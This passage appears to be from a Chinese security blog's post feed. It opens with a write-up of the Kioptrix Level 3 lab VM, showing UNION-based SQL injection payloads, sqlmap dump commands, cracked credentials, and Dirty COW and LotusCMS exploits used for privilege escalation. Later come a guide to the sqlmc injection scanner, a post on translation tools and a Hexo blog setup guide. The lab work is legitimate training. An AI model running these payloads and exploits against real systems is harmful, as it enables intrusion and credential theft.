alt="Pasted-image-20250101145945"></li><li>照片管理后台和泄露的版本文件。尝试万能密码无效果。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101171348.jpg" alt="Pasted-image-20250101171348"></li><li>发现页面存在SQL注入，根据后台版本去查找<code>poc</code>刚好也指向这个页面<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101172716.jpg" alt="Pasted-image-20250101172716"></li></ul><h6 id="SQL手动测试"><a href="#SQL手动测试" class="headerlink" title="SQL手动测试"></a>SQL手动测试</h6><ul><li><code>order by</code>根据第七个字段进行排序的时候报错了，证明只有六个字段</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">6</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101183236.jpg" alt="Pasted-image-20250101183236"></p><ul><li>联合查询六个字段，只显示查询的2，3字段，判断出显错点为2，3。</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101183821.jpg" alt="Pasted-image-20250101183821"></p><ul><li>根据已知的显错点，将字段查询改为数据库查询。得知数据库为<code>gallery</code></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database(),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101184150.jpg" alt="Pasted-image-20250101184150"></p><ul><li>查询<code>gallery</code>数据库中含有的表</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 union <span class="keyword">select</span> 1,2,group_concat(table_name),4,5,6 from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&quot;gallery&quot;</span> -- </span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101185819.jpg" alt="Pasted-image-20250101185819"></p><ul><li>注意到有个<code>users</code>表，查询他表的字段,注意到有用户名和密码字段</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 union <span class="keyword">select</span> 1,group_concat(column_name),3,4,5,6 from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&quot;gallarific_users&quot;</span> -- </span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101190611.jpg" alt="Pasted-image-20250101190611"></p><ul><li>查询表中用户名和密码字段的数据</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 union <span class="keyword">select</span> 1,group_concat(username),group_concat(password),4,5,6 from gallarific_users</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101191038.jpg" alt="Pasted-image-20250101191038"></p><ul><li>不过这个是博客后台的登录密码，回到了之前发现的后台页面登录进去，尝试文件上传，无效果。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101191710.jpg" alt="Pasted-image-20250101191710"></li><li>继续查询，注意到一可疑的<code>dev_accounts</code>。查询字段</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 union <span class="keyword">select</span> 1,group_concat(column_name),3,4,5,6 from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&quot;dev_accounts&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101192016.jpg" alt="Pasted-image-20250101192016"></p><ul><li>查询表中的数据</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 union <span class="keyword">select</span> 1,group_concat(username),group_concat(password),4,5,6 from dev_accounts</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101192304.jpg" alt="Pasted-image-20250101192304"></p><ul><li>通过MD5解密得知用户对应的密码，解密的网站：<a href="https://www.cmd5.com/">MD5在线解密</a>原理其实和碰撞一样，不过碰撞需要时间。而他有数据库记录了一些常见的。</li></ul><table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>dreg</td><td>Mast3r</td></tr><tr><td>loneferret</td><td>starwars</td></tr></tbody></table><h6 id="sqlmap-工具注入"><a href="#sqlmap-工具注入" class="headerlink" title="sqlmap|工具注入"></a>sqlmap|工具注入</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取当前数据库</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot;</span> --batch --current-db</span><br><span class="line"><span class="comment">#查询数据库中的表</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot;</span> --batch -D gallery -tables</span><br><span class="line"><span class="comment">#获取表的数据</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot;</span> --batch -D gallery -T gallarific_users,dev_accounts --dump</span><br></pre></td></tr></table></figure><h6 id="用户提权-方法一"><a href="#用户提权-方法一" class="headerlink" title="用户提权|方法一"></a>用户提权|方法一</h6><ul><li>尝试SSH登录两个账户需要指定密钥，权限等级都为普通权限</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-rsa loneferret@192.168.38.132</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101194037.jpg" alt="Pasted-image-20250101194037"></p><ul><li>查看系统内核架构和版本<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101201836.jpg" alt="Pasted-image-20250101201836"></li><li>查找<code>poc</code>，ubuntu下没可用<code>poc</code>内核需要进一步使用。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250102022918.jpg" alt="Pasted-image-20250102022918"></li><li><code>-m</code>复制到当前目录利用<code>python</code>的<code>http</code>服务上传上去。漏洞名字为：Dirty COW<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250102031002.jpg" alt="Pasted-image-20250102031002"></li><li>根据<code>exp</code>提示输入新密码，然后等待一段是时间就创建出一个新的用户和密码。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250102031454.jpg" alt="Pasted-image-20250102031454"></li><li>使用新用户和密码登录，直接是管理员权限了。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250102031720.jpg" alt="Pasted-image-20250102031720"></li></ul><h4 id="phpmyadmin目录"><a href="#phpmyadmin目录" class="headerlink" title="phpmyadmin目录"></a>phpmyadmin目录</h4><ul><li>一个phpmyadmin登录页面。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241231200305.jpg" alt="Pasted-image-20241231200305"></li><li>用户名使他闭合成功登录进去，不过看了看只能看到表的结构看不到内容<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101150954.jpg" alt="Pasted-image-20250101150954"></li><li><code>whatweb</code>获取指纹的版本信息，查找poc，未发现可留用点。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20241231201620.jpg" alt="Pasted-image-20241231201620"></li><li>管理系统的安装，不过没密码，尝试万能密码没效果。尝试使用上一个目录的密码也无效果。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250101150810.jpg" alt="Pasted-image-20250101150810"></li></ul><h4 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h4><ul><li>通过探索发现存在两个传参测试能爆出路径，不过不是伪协议。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250106020512.jpg" alt="Pasted-image-20250106020512"></li><li>在登录页面测试，不存在<code>sql</code>注入，注意到下面有个技术支持的，这个在信息收集中很重要。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250106020815.jpg" alt="Pasted-image-20250106020815"></li><li>查找相关的<code>poc</code>，发现存在历史漏洞，不过第一个要用<code>msf</code>掠过先去看第二个多个漏洞的<code>poc</code><br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250106021250.jpg" alt="Pasted-image-20250106021250"></li><li>只存在<code>XSS</code>和<code>CSRF</code>打靶机时没作用。。。。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250106021806.jpg" alt="Pasted-image-20250106021806"></li><li>查找到一个远程命令执行<code>exp</code>，<code>git</code>下载测试并执行。exp地址：<a href="https://github.com/murhussain/Mur-Kioptrix-LotusCMS-Exploit">地址</a><br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250106024948.jpg" alt="Pasted-image-20250106024948"></li><li>最近刚学到的一个方式来执行<code>bash</code>，通过python来创建一个提示<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250106030721.jpg" alt="Pasted-image-20250106030721"></li><li>获取系统信息<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250106030721.jpg" alt="Pasted-image-20250106030721"></li><li>使用<code>exp</code>获取，和上一个方法一样提权。<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250106031935.jpg" alt="Pasted-image-20250106031935"></li><li>登录提权成功<br><img src="https://imges.xenon.us.kg/20250107/Pasted-image-20250102031720.jpg" alt="Pasted-image-20250102031720"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuInhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title> Sqlmc | Sqlmap的磨刀石</title>
      <link href="/posts/3765a405.html"/>
      <url>/posts/3765a405.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote><p>Kali Linux 2024.3 版本，新增了 11 款安全工具之一，SQLMC（SQL Injection Massive Checker）一款用于扫描域以查找 SQL 注入漏洞的工具。它能按照指定深度抓取给定的 URL，检查每个链接是否存在 SQL 注入漏洞，扫描和检测域中可能存在的 SQL 注入漏洞。其目标是简化 SQLMap 的使用流程，为安全测试提供更快速的操作界面和功能支持。</p></blockquote><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="安装方式"><a href="#安装方式" class="headerlink" title="安装方式"></a>安装方式</h3><p>目前有三种途径下载</p><h4 id="一、通过KALI的包管理器"><a href="#一、通过KALI的包管理器" class="headerlink" title="一、通过KALI的包管理器"></a>一、通过KALI的包管理器</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install sqlmc -y</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250110/Pasted-image-20250104170649.jpg" alt="Pasted-image-20250104170649"></p><h4 id="二、pip包管理器安装"><a href="#二、pip包管理器安装" class="headerlink" title="二、pip包管理器安装"></a>二、pip包管理器安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#如果是python3自行更改</span></span><br><span class="line">pip install sqlmc</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250110/Pasted-image-20250104170933.jpg" alt="Pasted-image-20250104170933"></p><h4 id="三、下载源代码使用"><a href="#三、下载源代码使用" class="headerlink" title="三、下载源代码使用"></a>三、下载源代码使用</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/malvads/sqlmc.git</span><br><span class="line"><span class="built_in">cd</span> sqlmc</span><br><span class="line"><span class="comment">#创建虚拟环境，如果你不需要掠过这一步</span></span><br><span class="line">python3 -m venv sqlmc</span><br><span class="line"><span class="built_in">source</span> sqlmc/bin/activate</span><br><span class="line"><span class="comment">#安装相关依赖</span></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"><span class="comment">#启动测试</span></span><br><span class="line">python3 setup.py</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250110/Pasted-image-20250104172723.jpg" alt="Pasted-image-20250104172723"></p><h3 id="相关参数"><a href="#相关参数" class="headerlink" title="相关参数"></a>相关参数</h3><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmc [-h] -u URL -d DEPTH [-o OUTPUT]</span><br></pre></td></tr></table></figure><ul><li><code>-h</code>查看帮助</li><li><code>-u</code>指定url</li><li><code>-d</code>设置深度，官方没给出范围</li><li><code>-o</code>将结果输出到指定文件</li></ul><h3 id="使用测试"><a href="#使用测试" class="headerlink" title="使用测试"></a>使用测试</h3><ul><li>我找了个之前打的<code>Kioptrix-Leve 3</code>的靶机，里面有个sql注入的页面，不过我当初没留意到是通过博客版本去查<code>poc</code>时看见的，算是之前的马虎，发现难度不高。</li></ul><h4 id="站点测试"><a href="#站点测试" class="headerlink" title="站点测试"></a>站点测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmc -u http://kioptrix3.com/ -d 3 -o 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250110/Pasted-image-20250104173717.jpg" alt="Pasted-image-20250104173717"></p><h4 id="结果查看"><a href="#结果查看" class="headerlink" title="结果查看"></a>结果查看</h4><ul><li>具体的字段对应什么可以查看下表，总体来看主要功能还是属于查找可利用的注入点（传参点），配合<code>-o</code>参数将所有的传参点测试一遍。就如介绍的时候说得那样目的是为了简化sqlmap的使用流程，省去查找传参点的时间，直接将获取到的传参当作sqlmap的测试<code>url</code>来使用</li></ul><table><thead><tr><th>项目</th><th>描述</th></tr></thead><tbody><tr><td>URL</td><td>网站的访问地址。</td></tr><tr><td>Server</td><td>网站运行的服务器类型和版本。</td></tr><tr><td>Depth</td><td>扫描深度。</td></tr><tr><td>Vulnerable</td><td>是否存在漏洞。</td></tr></tbody></table><h4 id="与sqlmap配合使用"><a href="#与sqlmap配合使用" class="headerlink" title="与sqlmap配合使用"></a>与sqlmap配合使用</h4><ul><li>查看输出的结果，注意到他的格式内容<br><img src="https://imges.xenon.us.kg/20250110/Pasted-image-20250104174802.jpg" alt="Pasted-image-20250104174802"></li><li>将url的注入过滤出来</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | grep http | &gt; url.txt</span><br><span class="line"><span class="comment">#查看确认</span></span><br><span class="line"><span class="built_in">cat</span> url.txt</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250110/Pasted-image-20250104175113.jpg" alt="Pasted-image-20250104175113"></p><ul><li>将传参点过滤出来</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> url.txt | grep <span class="string">&quot;=&quot;</span> | &gt; url1.txt</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250110/Pasted-image-20250104190010.jpg" alt="Pasted-image-20250104190010"></p><ul><li>使用sqlmap进行测试，因为我这边包含有之前靶机的一个传参点能一下子跑出来，有一定的缓存记录。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -m <span class="string">&quot;url1.txt&quot;</span> --batch --dbs</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250110/Pasted-image-20250104190628.jpg" alt="Pasted-image-20250104190628"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总体来看<code>sqlmc</code>配合<code>sqlmap</code>，刚好是解决了<code>sqlmap</code>要自己去寻找传参点的缺点，但是找到的传参点不能保证是全都包含的，更多的还是需要手动去收集。而且考虑到在OSCP考试是不能使用<code>sqlmap</code>，<code>sqlmc</code>最多来说只能当作信息收集的一部分，用来挖掘传参点来进行测试。</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> Kali tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>英语小白的阅读指南：工具篇</title>
      <link href="/posts/41d7331c.html"/>
      <url>/posts/41d7331c.html</url>
      
        <content type="html"><![CDATA[<h2 id="序章"><a href="#序章" class="headerlink" title="序章"></a>序章</h2><p>在准备 OSCP 的过程中，我发现不少朋友因英语基础薄弱，面对命令报错等英文问题时常常陷入苦恼。这让我感同身受，因为我自己就是一个从农村走出来的孩子。从小学到初中，在村里的学校上学，几乎没有正经上过英语课，很长一段时间里，我对英文的认知仅仅停留在认识 26 个字母而已。在这样的情况下，每次遇到英文内容，单纯依靠自己去理解几乎是不可能的，只能借助翻译工具来辅助阅读。一路走来，积累了不少经验，也发现了许多实用的工具，今天就想借此机会，给大家分享一下我在日常学习中使用的这些 “秘密武器”，希望能帮助同样在英语困境中挣扎的朋友们。</p><h2 id="当前装备"><a href="#当前装备" class="headerlink" title="当前装备"></a>当前装备</h2><p>现在我主要是利用<strong>TTime</strong>和<strong>沉浸式翻译</strong>来辅助我日常翻译英语，<strong>TTime</strong>他主要是利用<strong>OCR</strong>识别单词然后利用接入的各大翻译平台的API来进行翻译，OCR识别来说我使用较少，大部分都是选中不认识的单词部分直接划词翻译的。<strong>沉浸式翻译</strong>的话那这个可就太解决大部分网页浏览的翻译问题，大家都知道<strong>google翻译</strong>现在已经撤出中国市场了。我也不可能说一整天开着个代理去翻译吧，这个就太麻烦了。</p><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><p>如果你只想拿工具直接关注公众发送<strong>翻译工具</strong>即可获取官网下载链接或者博客主页右上角获取<strong>文章工具</strong>，使用打包好的Windows网盘链接。</p><h2 id="浏览器翻译"><a href="#浏览器翻译" class="headerlink" title="浏览器翻译"></a>浏览器翻译</h2><p>这个市面上就太多了，但是我只推荐一个，那就是<strong>沉浸式翻译</strong>，有付费的翻译API和免费的API，免费的已经能满足大部分日常使用，电脑配置比较高的还可以接入本地大模型来翻译，直接做到了离线翻译。而且适配市面上大部分浏览器。同时也支持翻译PDF。</p><h3 id="未翻译效果"><a href="#未翻译效果" class="headerlink" title="未翻译效果"></a>未翻译效果</h3><p>这里就随便找一文章，这个是未翻译的效果，看到直接头大的了<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229170105.jpg" alt="Pasted-image-20241229170105"></p><h3 id="使用插件翻译"><a href="#使用插件翻译" class="headerlink" title="使用插件翻译"></a>使用插件翻译</h3><ul><li>点击右边粉色翻译图标，直接在原文的下方给出译文，特别直观。<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229170346.jpg" alt="Pasted-image-20241229170346"></li></ul><h3 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h3><ul><li>如果翻译不了的可以点图标下方的设置切换翻译源，同时也可以将插件置顶方便日常使用。<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229171146.jpg" alt="Pasted-image-20241229171146"></li></ul><h2 id="划词翻译"><a href="#划词翻译" class="headerlink" title="划词翻译"></a>划词翻译</h2><h3 id="Pot翻译"><a href="#Pot翻译" class="headerlink" title="Pot翻译"></a>Pot翻译</h3><ul><li>支持三大平台<code>WIn</code>、<code>MAC</code>、<code>Liunx</code></li><li>支持快捷键启动：输入翻译、截图翻译、划词翻译<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229172627.jpg" alt="Pasted-image-20241229172627"></li><li>包含默认免费的翻译源。翻译效果来说个人感觉是<code>DeePL</code>翻译比较好<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229172840.jpg" alt="Pasted-image-20241229172840"></li><li>截图翻译，不要使用系统识别，效果较差。<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229173458.jpg" alt="Pasted-image-20241229173458"></li></ul><h3 id="TTime翻译"><a href="#TTime翻译" class="headerlink" title="TTime翻译"></a>TTime翻译</h3><ul><li>支持三大平台<code>WIn</code>、<code>MAC</code>、<code>Liunx</code>。<ul><li>官网没显示Liunx平台但是我KALI下使用的翻译就是他。原先安装<code>Pot</code>安装不了，TTime却可以。<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229173948.jpg" alt="Pasted-image-20241229173948"></li></ul></li><li>支持快捷键启动：输入翻译、截图翻译、划词翻译、图片翻译、替换翻译<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229174054.jpg" alt="Pasted-image-20241229174054"></li><li>包含默认免费的翻译源和官方自带的。翻译效果来说个人感觉是<code>DeePL</code>翻译比较好。<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229175023.jpg" alt="Pasted-image-20241229175023"></li><li>截图翻译效果<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229174527.jpg" alt="Pasted-image-20241229174527"></li></ul><h3 id="微信翻译"><a href="#微信翻译" class="headerlink" title="微信翻译"></a>微信翻译</h3><ul><li>当然这个说一嘴，微信也是支持翻译，类似于替换翻译。只要你设置了快捷键，而且微信在后台。<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229175218.jpg" alt="Pasted-image-20241229175218"></li><li>翻译效果，只支持截图，不支持划词，平台嘛。也就<code>win</code>下可以。<br><img src="https://imges.xenon.us.kg/ico/Pasted-image-20241229175333.jpg" alt="Pasted-image-20241229175333"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客序章</title>
      <link href="/posts/40011d74.html"/>
      <url>/posts/40011d74.html</url>
      
        <content type="html"><![CDATA[<h2 id="序章"><a href="#序章" class="headerlink" title="序章"></a>序章</h2><ol><li>为什么打算搭建博客？<ul><li>很多时候我看了一本书，心中突然冒出的一个想法，甚至是突然学到了一个东西却没有及时的记录他，等过段时间去回想书中的内容时就，书中的那些概念理论会一下子忘却了，变成了空谈的大道理。下次遇到相同的问题的时候明明之前有解决的但是脑子也是抽了一样只会<kbd>CTRL</kbd> <kbd>C</kbd>+<kbd>CTRL</kbd> <kbd>V</kbd>重复一次又一次。特别是时不时翻到之前写的垃圾<code>Note</code>把自己拉进坑了一次又一次，却懒得重新去修正。就会陷入我明明知道之前的是错的不够完善的，这次知道了，后面去回看还是会掉入以前挖的大坑中……于是就开始使用<code>obsidian</code>开始记录自己的阅读以及一些课堂<code>Note</code>，但是输入也只能是输入，为了后续能够更好的去完善所学的知识，不至于自我满足的状态，就搭建一个博客平台，来帮助我从<code>obsidian</code>里输出内容。以及记录些自身一些想法等。</li></ul></li><li>博客的总体架构<ul><li>截止目前的话博客的整体结构是：采用于<code>pages</code>部署在<code>github</code>上，博客框架为<code>hexo</code>、加上<code>github</code>图床、配上一个域名解析。目前基本能够正常使用。</li></ul></li></ol><h2 id="博客框架选择"><a href="#博客框架选择" class="headerlink" title="博客框架选择"></a>博客框架选择</h2><ul><li>目前市面上有太多博客框架，主要分为两种类型：<code>动态</code>、<code>静态</code><ul><li>动态的：WordPress、halo、Typecho等。<ul><li>特点：依赖服务器和数据库支持。优点是方便、上手简单。</li></ul></li><li>静态的：hexo、hugo、VuePress、docsify等<ul><li>特点：采用<code>markdown</code>编写和渲染，无须依赖数据库，无后端，根据框架的不同上手难度不同。</li></ul></li></ul></li></ul><blockquote><p>个人建议</p><blockquote><p>建议制作博客之前先决定好自己的需求来选择，都去了解一下，确定好需求再来选择搭建，另外一个博客要根据自己想法做成自己喜欢和能用的地步需要的是循循渐进。先知道博客框架的大概组成，那个文件是干什么的，这个文件夹里面放的是什么。后续再根据需求去扩展找主题啊！要扩展一些什么新东西啊！当然有些功能可能有部分主题作者可能已经内置在主题里面了方便后续扩展，或者你喜欢这个主题的UI但是他没有你需要添加的那种功能也不用怕，因为在Hexo这里一切功能想要的效果都可以后续通过插件和添加样式或者修改源代码来完成的。自由度相对其他生成类的博客框架来说是最高的。插件众多也避免了重复造轮子。</p></blockquote></blockquote><h2 id="Hexo框架博客所需要的东西"><a href="#Hexo框架博客所需要的东西" class="headerlink" title="Hexo框架博客所需要的东西"></a>Hexo框架博客所需要的东西</h2><ul><li>必须知识点：<ul><li><code>node.js</code>的环境配置、基本的<code>HTML</code>语法、<code>YAML</code>语法格式</li><li>对文件路径的大概认识，知道什么是相对什么是绝对。</li><li><code>markdown</code>语法的基本格式可参考<a href="https://markdown.com.cn/basic-syntax/">Markdown 基本语法</a></li></ul></li><li>扩展知识点<ul><li>需要对互联网的域名解析有个大概的了解，知道什么是<code>A</code>记录、<code>AAAA</code>记录、<code>CNAME</code>记录等，知道CDN的原理。</li><li>懂得<code>git</code>的基本命令，怎么拉取、提交、撤回。<code>github action</code>的基本概念和使用。</li><li><code>vercel</code>的基本概念和使用</li><li>搜索引擎网站收录的要求及配置</li><li><code>JavaScript</code>的基本语法，后续如果想拓展主题功能或者更改页面添加什么的时候就需要</li></ul></li><li>需要准备的<ul><li>至少有其中一个的账号后续博客将会部署到上面：<code>pages</code>：可以理解为一个帮你托管静态应用的平台<ul><li><code>github</code>：国内访问较慢，有域名就快</li><li><code>gitee</code>：国内访问正常。国外不行。后续扩展话不怎么适合。</li><li><code>gitlab</code>：没用过不怎么了解。</li><li>—–分隔扩展(以下的除了<code>cloudflare</code>另外一个则需要<code>github</code>或者<code>gitlab</code>)——</li><li><code>cloudflare</code>：可以直接将<code>github</code>和<code>gitlab</code>的博客部署上去，解决访问慢的问题，不过没这两个账号也可以。</li><li><code>vercel</code>：一样国内访问慢，不过后续扩展会用到，不扩展不建议。</li><li><code>帽子云</code>：需要有<code>github</code>账号，目前较新的静态页面部署，访问速度较快。</li><li><code>webify</code>：腾讯旗下的应用部署平台，国内速度快。有一定额度限制。</li><li>等……</li></ul></li><li>markdown编辑器喜欢的就行：<ul><li><code>vscode</code>：可以用的程度。</li><li><code>obsidian</code>：markdown中的<code>vscode</code>，可简单可复杂。对自由度高的推荐。</li><li><code>Typora</code>：主流的编辑器，想要简单的就推荐</li><li>等…..</li></ul></li><li>可不用：<ul><li>域名：只要有了域名部署在哪里访问都快。</li><li>图床：博客图片数量差不多的情况下，可以不外链图片，但是建议搞个。<ul><li>主流的：阿里云、七牛云、腾讯云等一些小型、免费图床托管。。。</li><li>其他的：github图床。</li></ul></li></ul></li></ul></li></ul><h2 id="环境基本配置"><a href="#环境基本配置" class="headerlink" title="环境基本配置"></a>环境基本配置</h2><h3 id="Liunx下环境配置"><a href="#Liunx下环境配置" class="headerlink" title="Liunx下环境配置"></a>Liunx下环境配置</h3><ol><li>如果你是<code>Liunx</code>的话用你的包管理器下载<code>git</code>和<code>nodejs</code>，我这边使用的为<code>Ubuntu</code></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#安装</span><br><span class="line">apt update</span><br><span class="line">apt install git nodejs -y</span><br><span class="line">#验证(能正常显示版本即可)</span><br><span class="line">git --version</span><br><span class="line">node -v</span><br></pre></td></tr></table></figure><h3 id="Windows下配置环境"><a href="#Windows下配置环境" class="headerlink" title="Windows下配置环境"></a>Windows下配置环境</h3><h4 id="Git配置"><a href="#Git配置" class="headerlink" title="Git配置"></a>Git配置</h4><p>Git官网下载<a class="btn-anzhiyu " href="https://git-scm.com/downloads/win"   title="Git"><span>Git</span></a></p><ol><li>根据系统架构选择，大部分默认64位，<del>现在难道还有32位的电脑嘛</del><br><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228022837.jpg" alt="Pasted-image-20241228022837"></li><li>不清楚配置的除了安装路径外一路默认即可，然后点击完成。<br><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228024049.jpg" alt="Pasted-image-20241228024049"></li><li>打开命令行<kbd>win</kbd> <kbd>R</kbd> 输入<code>cmd</code>，输入以下命令能正常显示版本信息证明安装完成。</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git -v</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228024407.jpg" alt="Pasted-image-20241228024407"></p><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><p>Node.js官网下载<a class="btn-anzhiyu " href="https://nodejs.org/zh-cn"   title="Node.js"><span>Node.js</span></a></p><ol><li>直接下载即可，现在默认即为<code>22</code>版本以上，不能低于<code>14</code>。<br><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228024757.jpg" alt="Pasted-image-20241228024757"></li><li>不清楚配置的除了安装路径外一路默认即可，然后点击完成。<br><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228025020.jpg" alt="Pasted-image-20241228025020"></li><li>打开命令行<kbd>win</kbd> <kbd>R</kbd> 输入<code>cmd</code>，输入以下命令能正常显示版本信息证明安装完成。</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241228/Pasted-image-20241228025132.jpg" alt="Pasted-image-20241228025132"></p><h4 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h4><p>建议后续看一遍官方文档，毕竟这个才是一手资料，后续如果需要完善和部署中的大大小小问题大部分都能在文档里面找到答案。这里做个引路。<a class="btn-anzhiyu " href="https://hexo.io/zh-cn/docs/"   title="Hexo"><span>Hexo</span></a></p><ol><li>更换<code>npm</code>软件源，官方的在国外访问较慢。直接在<code>阿里源</code>、<code>华为</code>等镜像站搜索<code>npm</code>获取最新。</li></ol><figure class="highlight 